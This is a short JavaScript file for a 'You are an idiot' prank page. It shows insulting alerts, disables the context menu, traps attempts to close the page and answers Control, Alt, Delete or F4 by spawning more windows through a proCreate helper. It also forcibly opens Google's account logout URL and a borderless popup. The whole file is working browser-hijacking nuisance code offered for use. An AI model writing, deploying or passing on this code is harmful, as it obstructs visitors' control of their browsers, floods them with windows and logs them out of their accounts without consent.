window.onbeforeunload = () => "Are you an idiot?";
window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(6);
		alert("You are an idiot!");
	}
	
	return null;
}
async function handleClick() {
	await proCreate(6,"troll.html");
	window.onbeforeunload = () => "Are you an idiot?";
};
window.onload = playBall;

alert("YOU ARE AN IDIOT!! HGAHAHAHA");
proCreate(3,"https://www.google.com/accounts/Logout")
proCreate(1,"troll.html")
function openxWindow(url) {
	window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}
openxWindow("https://www.youtube.com/watch?v=NARxgXEdlzs")
